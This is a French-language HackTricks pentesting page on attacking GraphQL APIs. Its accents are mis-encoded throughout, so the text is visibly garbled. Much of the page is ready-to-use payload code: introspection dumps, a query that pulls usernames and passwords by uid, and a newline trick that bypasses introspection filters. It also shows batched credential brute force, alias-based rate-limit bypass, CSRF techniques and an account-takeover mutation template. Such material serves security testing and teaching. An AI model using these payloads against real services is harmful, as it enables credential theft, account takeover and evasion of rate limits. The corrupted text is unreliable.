# GraphQL

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## Introduction

GraphQL est **soulign√©** comme une **alternative efficace** aux API REST, offrant une approche simplifi√©e pour interroger les donn√©es du backend. Contrairement √† REST, qui n√©cessite souvent de nombreuses requ√™tes sur des points de terminaison vari√©s pour collecter des donn√©es, GraphQL permet de r√©cup√©rer toutes les informations requises via une **seule requ√™te**. Cette rationalisation b√©n√©ficie consid√©rablement aux d√©veloppeurs en r√©duisant la complexit√© de leurs processus de r√©cup√©ration de donn√©es.

## GraphQL et S√©curit√©

Avec l'av√®nement de nouvelles technologies, y compris GraphQL, de nouvelles vuln√©rabilit√©s de s√©curit√© √©mergent √©galement. Un point cl√© √† noter est que **GraphQL ne comprend pas de m√©canismes d'authentification par d√©faut**. Il incombe aux d√©veloppeurs de mettre en ≈ìuvre de telles mesures de s√©curit√©. Sans une authentification appropri√©e, les points de terminaison GraphQL peuvent exposer des informations sensibles √† des utilisateurs non authentifi√©s, posant un risque de s√©curit√© significatif.

### Attaques de Force Brute de R√©pertoire et GraphQL

Pour identifier les instances GraphQL expos√©es, l'inclusion de chemins sp√©cifiques dans des attaques de force brute de r√©pertoire est recommand√©e. Ces chemins sont :

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

Identifier les instances GraphQL ouvertes permet d'examiner les requ√™tes prises en charge. Cela est crucial pour comprendre les donn√©es accessibles via le point de terminaison. Le syst√®me d'introspection de GraphQL facilite cela en d√©taillant les requ√™tes qu'un sch√©ma prend en charge. Pour plus d'informations √† ce sujet, consultez la documentation GraphQL sur l'introspection : [**GraphQL : Un langage de requ√™te pour les API.**](https://graphql.org/learn/introspection/)

### Empreinte

L'outil [**graphw00f**](https://github.com/dolevf/graphw00f) est capable de d√©tecter quel moteur GraphQL est utilis√© sur un serveur, puis imprime des informations utiles pour l'auditeur de s√©curit√©.

#### Requ√™tes universelles <a href="#universal-queries" id="universal-queries"></a>

Pour v√©rifier si une URL est un service GraphQL, une **requ√™te universelle**, `query{__typename}`, peut √™tre envoy√©e. Si la r√©ponse inclut `{"data": {"__typename": "Query"}}`, cela confirme que l'URL h√©berge un point de terminaison GraphQL. Cette m√©thode repose sur le champ `__typename` de GraphQL, qui r√©v√®le le type de l'objet interrog√©.
```javascript
query{__typename}
```
### √ânum√©ration de base

Graphql prend g√©n√©ralement en charge **GET**, **POST** (x-www-form-urlencoded) et **POST**(json). Bien que pour des raisons de s√©curit√©, il est recommand√© de n'autoriser que le json pour pr√©venir les attaques CSRF.

#### Introspection

Pour utiliser l'introspection afin de d√©couvrir des informations sur le sch√©ma, interrogez le champ `__schema`. Ce champ est disponible sur le type racine de toutes les requ√™tes.
```bash
query={__schema{types{name,fields{name}}}}
```
Avec cette requ√™te, vous trouverez le nom de tous les types utilis√©s :

![](<../../.gitbook/assets/image (202).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

Avec cette requ√™te, vous pouvez extraire tous les types, leurs champs et leurs arguments (ainsi que le type des arguments). Cela sera tr√®s utile pour savoir comment interroger la base de donn√©es.

![](<../../.gitbook/assets/image (207) (3).png>)

**Erreurs**

Il est int√©ressant de savoir si les **erreurs** vont √™tre **affich√©es** car elles contribueront avec des **informations** utiles.
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
**√ânum√©rer le sch√©ma de la base de donn√©es via l'introspection**

{% hint style="info" %}
Si l'introspection est activ√©e mais que la requ√™te ci-dessus ne s'ex√©cute pas, essayez de supprimer les directives `onOperation`, `onFragment` et `onField` de la structure de la requ√™te.
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Requ√™te d'inspection en ligne :
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
La derni√®re ligne de code est une requ√™te graphql qui va extraire toutes les m√©tadonn√©es du graphql (noms d'objets, param√®tres, types...)

![](<../../.gitbook/assets/image (206).png>)

Si l'introspection est activ√©e, vous pouvez utiliser [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) pour visualiser dans une interface graphique toutes les options.

### Interrogation

Maintenant que nous savons quel type d'informations est stock√© dans la base de donn√©es, essayons d'**extraire certaines valeurs**.

Dans l'introspection, vous pouvez trouver **quels objets vous pouvez interroger directement** (car vous ne pouvez pas interroger un objet juste parce qu'il existe). Dans l'image suivante, vous pouvez voir que le "_queryType_" est appel√© "_Query_" et qu'un des champs de l'objet "_Query_" est "_flags_", qui est √©galement un type d'objet. Par cons√©quent, vous pouvez interroger l'objet de drapeau.

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-17-48.png)

Notez que le type de la requ√™te "_flags_" est "_Flags_", et que cet objet est d√©fini comme suit :

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-22-57.png)

Vous pouvez voir que les objets "_Flags_" sont compos√©s par **name** et **value**. Ensuite, vous pouvez obtenir tous les noms et valeurs des drapeaux avec la requ√™te :
```javascript
query={flags{name, value}}
```
Notez que dans le cas o√π l'**objet √† interroger** est un **type primitif** comme une **cha√Æne de caract√®res** comme dans l'exemple suivant

![](<../../.gitbook/assets/image (441).png>) 

Vous pouvez simplement interroger avec:
```javascript
query={hiddenFlags}
```
Dans un autre exemple o√π il y avait 2 objets √† l'int√©rieur de l'objet de type "_Query_" : "_user_" et "_users_".\
Si ces objets n'ont pas besoin d'arguments pour √™tre recherch√©s, vous pouvez **r√©cup√©rer toutes les informations √† leur sujet** en demandant simplement les donn√©es que vous voulez. Dans cet exemple sur Internet, vous pourriez extraire les noms d'utilisateur et les mots de passe enregistr√©s :

![](<../../.gitbook/assets/image (208).png>)

Cependant, dans cet exemple, si vous essayez de le faire, vous obtenez cette **erreur** :

![](<../../.gitbook/assets/image (210).png>)

Il semble qu'il effectuera la recherche en utilisant l'argument "_**uid**_" de type _**Int**_.\
Quoi qu'il en soit, nous savions d√©j√† que, dans la section [√ânum√©ration de base](graphql.md#basic-enumeration), une requ√™te avait √©t√© propos√©e qui nous montrait toutes les informations n√©cessaires : `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Si vous lisez l'image fournie lorsque j'ai ex√©cut√© cette requ√™te, vous verrez que "_**user**_" avait l'**arg** "_**uid**_" de type _Int_.

Ainsi, en effectuant une l√©g√®re attaque par force brute sur l'_**uid**_, j'ai d√©couvert qu'avec l'_**uid**=**1**_, un nom d'utilisateur et un mot de passe ont √©t√© r√©cup√©r√©s :\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (211).png>)

Notez que j'ai **d√©couvert** que je pouvais demander les **param√®tres** "_**user**_" et "_**password**_" car si j'essaie de chercher quelque chose qui n'existe pas (`query={user(uid:1){noExists}}`), j'obtiens cette erreur :

![](<../../.gitbook/assets/image (213).png>)

Et lors de la phase d'**√©num√©ration**, j'ai d√©couvert que l'objet "_**dbuser**_" avait comme champs "_**user**_" et "_**password**_.

**Astuce de vidage de cha√Æne de requ√™te (merci √† @BinaryShadow\_)**

Si vous pouvez rechercher par un type cha√Æne de caract√®res, comme : `query={theusers(description: ""){username,password}}` et que vous **recherchez une cha√Æne vide**, cela **videra toutes les donn√©es**. (_Notez que cet exemple n'est pas li√© √† l'exemple des tutoriels, pour cet exemple, supposez que vous pouvez rechercher en utilisant "**theusers**" par un champ de type cha√Æne de caract√®res appel√© "**description**"_).

### Recherche

Dans cette configuration, une **base de donn√©es** contient des **personnes** et des **films**. Les **personnes** sont identifi√©es par leur **e-mail** et leur **nom** ; les **films** par leur **nom** et leur **classement**. Les **personnes** peuvent √™tre amies les unes avec les autres et avoir √©galement des films, indiquant des relations au sein de la base de donn√©es.

Vous pouvez **rechercher** des personnes **par** le **nom** et obtenir leurs adresses e-mail :
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
Vous pouvez **rechercher** des personnes **par** leur **nom** et obtenir les **films** auxquels elles sont **abonn√©es** :
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Notez comment il est indiqu√© de r√©cup√©rer le `name` des `subscribedMovies` de la personne.

Vous pouvez √©galement **rechercher plusieurs objets en m√™me temps**. Dans ce cas, une recherche de 2 films est effectu√©e :
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
Ou m√™me **relations de plusieurs objets diff√©rents en utilisant des alias** :
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutations

**Les mutations sont utilis√©es pour effectuer des changements c√¥t√© serveur.**

Dans l'**introspection**, vous pouvez trouver les **mutations** **d√©clar√©es**. Dans l'image suivante, le "_MutationType_" est appel√© "_Mutation_" et l'objet "_Mutation_" contient les noms des mutations (comme "_addPerson_" dans ce cas) :

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-26-27.png)

Dans cette configuration, une **base de donn√©es** contient des **personnes** et des **films**. Les **personnes** sont identifi√©es par leur **email** et leur **nom** ; les **films** par leur **nom** et leur **note**. Les **personnes** peuvent √™tre amies les unes avec les autres et avoir √©galement des films, indiquant des relations au sein de la base de donn√©es.

Une mutation pour **cr√©er de nouveaux** films dans la base de donn√©es peut ressembler √† celle-ci (dans cet exemple, la mutation est appel√©e `addMovie`) :
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Notez comment les valeurs et le type de donn√©es sont indiqu√©s dans la requ√™te.**

De plus, la base de donn√©es prend en charge une op√©ration de **mutation**, nomm√©e `addPerson`, qui permet la cr√©ation de **personnes** ainsi que leur association √† des **amis** et des **films** existants. Il est crucial de noter que les amis et les films doivent pr√©exister dans la base de donn√©es avant de les lier √† la personne nouvellement cr√©√©e.
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### Surcharge de directive

Comme expliqu√© dans [**l'une des vuln√©rabilit√©s d√©crites dans ce rapport**](https://www.landh.tech/blog/20240304-google-hack-50000/), une surcharge de directive implique d'appeler une directive m√™me des millions de fois pour amener le serveur √† gaspiller des op√©rations jusqu'√† ce qu'il soit possible de le soumettre √† une attaque par d√©ni de service (DoS).

### Force brute par lots en 1 requ√™te API

Ces informations ont √©t√© prises sur [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
L'authentification via l'API GraphQL consiste √† **envoyer simultan√©ment de nombreuses requ√™tes avec des identifiants diff√©rents** pour les v√©rifier. Il s'agit d'une attaque de force brute classique, mais il est maintenant possible d'envoyer plus d'une paire de login/mot de passe par requ√™te HTTP en raison de la fonctionnalit√© de lotissement de GraphQL. Cette approche tromperait les applications de surveillance des taux externes en leur faisant croire que tout va bien et qu'il n'y a pas de robot de force brute essayant de deviner des mots de passe.

Ci-dessous, vous trouverez la d√©monstration la plus simple d'une demande d'authentification d'application, avec **3 paires d'adresses e-mail/mot de passe diff√©rentes √† la fois**. Il est √©videmment possible d'en envoyer des milliers en une seule requ√™te de la m√™me mani√®re :

![](<../../.gitbook/assets/image (182) (1).png>)

Comme le montre la capture d'√©cran de la r√©ponse, les premi√®re et troisi√®me requ√™tes ont renvoy√© _null_ et ont refl√©t√© les informations correspondantes dans la section _error_. La **deuxi√®me mutation avait les donn√©es d'authentification correctes** et la r√©ponse contenait le jeton de session d'authentification correct.

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL sans introspection

De plus en plus de **points de terminaison GraphQL d√©sactivent l'introspection**. Cependant, les erreurs que GraphQL renvoie lorsqu'une requ√™te inattendue est re√ßue sont suffisantes pour des outils comme [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) pour recr√©er la majeure partie du sch√©ma.

De plus, l'extension Burp Suite [**GraphQuail**](https://github.com/forcesunseen/graphquail) **observe les requ√™tes d'API GraphQL passant par Burp** et **construit** un sch√©ma GraphQL interne √† chaque nouvelle requ√™te qu'il voit. Il peut √©galement exposer le sch√©ma pour GraphiQL et Voyager. L'extension renvoie une fausse r√©ponse lorsqu'elle re√ßoit une requ√™te d'introspection. En cons√©quence, GraphQuail affiche toutes les requ√™tes, arguments et champs disponibles pour une utilisation dans l'API. Pour plus d'informations, [**consultez ceci**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

Une **liste de mots** int√©ressante pour d√©couvrir les [**entit√©s GraphQL peut √™tre trouv√©e ici**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Contournement des d√©fenses d'introspection GraphQL <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

### **Contournement des d√©fenses d'introspection GraphQL**

Pour contourner les restrictions sur les requ√™tes d'introspection dans les API, l'insertion d'un **caract√®re sp√©cial apr√®s le mot-cl√© `__schema`** s'av√®re efficace. Cette m√©thode exploite les erreurs courantes des d√©veloppeurs dans les mod√®les regex qui visent √† bloquer l'introspection en se concentrant sur le mot-cl√© `__schema`. En ajoutant des caract√®res comme des **espaces, des sauts de ligne et des virgules**, que GraphQL ignore mais qui pourraient ne pas √™tre pris en compte dans les regex, les restrictions peuvent √™tre contourn√©es. Par exemple, une requ√™te d'introspection avec un saut de ligne apr√®s `__schema` peut contourner de telles d√©fenses :
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
Si cela √©choue, envisagez des m√©thodes de requ√™te alternatives, telles que les **requ√™tes GET** ou les **POST avec `x-www-form-urlencoded`**, car des restrictions peuvent s'appliquer uniquement aux requ√™tes POST.

### **D√©couverte des structures GraphQL expos√©es**

Lorsque l'introspection est d√©sactiv√©e, l'examen du code source du site web √† la recherche de requ√™tes pr√©charg√©es dans les biblioth√®ques JavaScript est une strat√©gie utile. Ces requ√™tes peuvent √™tre trouv√©es en utilisant l'onglet `Sources` dans les outils de d√©veloppement, fournissant des informations sur le sch√©ma de l'API et r√©v√©lant potentiellement des **requ√™tes sensibles expos√©es**. Les commandes pour rechercher dans les outils de d√©veloppement sont :
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## CSRF dans GraphQL

Si vous ne savez pas ce qu'est le CSRF, lisez la page suivante:

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

Vous pourrez trouver plusieurs points de terminaison GraphQL **configur√©s sans jetons CSRF.**

Notez que les requ√™tes GraphQL sont g√©n√©ralement envoy√©es via des requ√™tes POST en utilisant le Content-Type **`application/json`**.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
Cependant, la plupart des points de terminaison GraphQL prennent √©galement en charge les **requ√™tes POST** **`form-urlencoded` :**
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Par cons√©quent, comme les requ√™tes CSRF comme les pr√©c√©dentes sont envoy√©es **sans requ√™tes de pr√©-v√©rification**, il est possible d'**effectuer** des **changements** dans le GraphQL en abusant d'une CSRF.

Cependant, notez que la nouvelle valeur par d√©faut du cookie pour le drapeau `samesite` de Chrome est `Lax`. Cela signifie que le cookie ne sera envoy√© que depuis un site web tiers dans les requ√™tes GET.

Notez qu'il est g√©n√©ralement possible d'envoyer la **requ√™te** **query** √©galement en tant que requ√™te **GET et que le jeton CSRF pourrait ne pas √™tre valid√© dans une requ√™te GET.**

De plus, en abusant d'une [attaque **XS-Search**](../../pentesting-web/xs-search.md), il pourrait √™tre possible d'extraire du contenu de l'endpoint GraphQL en abusant des informations d'identification de l'utilisateur.

Pour plus d'informations, **consultez le** [**message original ici**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## Autorisation dans GraphQL

De nombreuses fonctions GraphQL d√©finies sur l'endpoint pourraient uniquement v√©rifier l'authentification du demandeur mais pas l'autorisation.

La modification des variables d'entr√©e de la requ√™te pourrait entra√Æner la divulgation de d√©tails sensibles sur le compte [fuit√©](https://hackerone.com/reports/792927).

Une mutation pourrait m√™me entra√Æner une prise de contr√¥le de compte en essayant de modifier les donn√©es d'autres comptes.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### Contourner l'autorisation en GraphQL

[Chainer des requ√™tes](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) peut contourner un syst√®me d'authentification faible.

Dans l'exemple ci-dessous, vous pouvez voir que l'op√©ration est "forgotPassword" et qu'elle ne devrait ex√©cuter que la requ√™te forgotPassword qui lui est associ√©e. Cela peut √™tre contourn√© en ajoutant une requ√™te √† la fin, dans ce cas, nous ajoutons "register" et une variable utilisateur pour que le syst√®me s'inscrive en tant que nouvel utilisateur.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## Contourner les limites de taux en utilisant des alias en GraphQL

En GraphQL, les alias sont une fonctionnalit√© puissante qui permet de **nommer explicitement les propri√©t√©s** lors de l'envoi d'une requ√™te API. Cette capacit√© est particuli√®rement utile pour r√©cup√©rer **plusieurs instances du m√™me type** d'objet dans une seule requ√™te. Les alias peuvent √™tre utilis√©s pour surmonter la limitation qui emp√™che les objets GraphQL d'avoir plusieurs propri√©t√©s avec le m√™me nom.

Pour une compr√©hension d√©taill√©e des alias GraphQL, la ressource suivante est recommand√©e : [Aliases](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Alors que l'objectif principal des alias est de r√©duire la n√©cessit√© de nombreuses appels API, un cas d'utilisation non intentionnel a √©t√© identifi√© o√π les alias peuvent √™tre exploit√©s pour ex√©cuter des attaques par force brute sur un point de terminaison GraphQL. Cela est possible car certains points de terminaison sont prot√©g√©s par des limiteurs de taux con√ßus pour contrer les attaques par force brute en restreignant le **nombre de requ√™tes HTTP**. Cependant, ces limiteurs de taux pourraient ne pas tenir compte du nombre d'op√©rations dans chaque requ√™te. √âtant donn√© que les alias permettent d'inclure plusieurs requ√™tes dans une seule requ√™te HTTP, ils peuvent contourner de telles mesures de limitation de taux.

Consid√©rez l'exemple fourni ci-dessous, qui illustre comment les requ√™tes alias√©es peuvent √™tre utilis√©es pour v√©rifier la validit√© des codes de r√©duction de magasin. Cette m√©thode pourrait contourner la limitation de taux car elle compile plusieurs requ√™tes en une seule requ√™te HTTP, permettant potentiellement de v√©rifier simultan√©ment de nombreux codes de r√©duction.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## Outils

### Scanners de vuln√©rabilit√©s

* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler) : Bo√Æte √† outils qui peut √™tre utilis√©e pour r√©cup√©rer des sch√©mas et rechercher des donn√©es sensibles, tester l'autorisation, forcer les sch√©mas et trouver des chemins vers un type donn√©.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html) : Peut √™tre utilis√© en tant que standalone ou [extension Burp](https://github.com/doyensec/inql).
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap) : Peut √™tre utilis√© en tant que client CLI pour automatiser les attaques.
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum) : Outil qui r√©pertorie les diff√©rentes fa√ßons d'atteindre un type donn√© dans un sch√©ma GraphQL.
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql) : Extension Burp pour des tests GraphQL avanc√©s. Le _**Scanner**_ est le c≈ìur d'InQL v5.0, o√π vous pouvez analyser un point de terminaison GraphQL ou un fichier de sch√©ma d'introspection local. Il g√©n√®re automatiquement toutes les requ√™tes et mutations possibles, les organisant dans une vue structur√©e pour votre analyse. Le composant _**Attaquant**_ vous permet d'ex√©cuter des attaques GraphQL en lot, ce qui peut √™tre utile pour contourner les limites de taux mal impl√©ment√©es.

### Clients

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql) : Client GUI
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/) : Client GUI

### Tests automatiques

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* Vid√©o expliquant AutoGraphQL : [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## R√©f√©rences

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez** üí¨ le groupe Discord](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
